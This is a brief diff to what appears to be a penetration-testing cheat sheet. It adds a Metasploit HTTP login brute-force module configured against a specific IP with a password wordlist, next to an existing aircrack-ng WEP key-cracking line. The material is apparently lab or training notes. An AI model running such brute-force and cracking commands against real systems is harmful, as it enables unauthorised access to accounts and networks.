@@ -34,7 +34,13 @@ aircrack-ng -b 00:21:91:d2:8e:25 WEP-Cracking.cap
 
 # HTTP
 ```sh
-
+use auxiliary/scanner/http/http_login
+set RHOSTS 192.165.34.3
+set USER_FILE /tmp/users
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+set AUTH_URI /poc/
+exploit
 ```
 
 
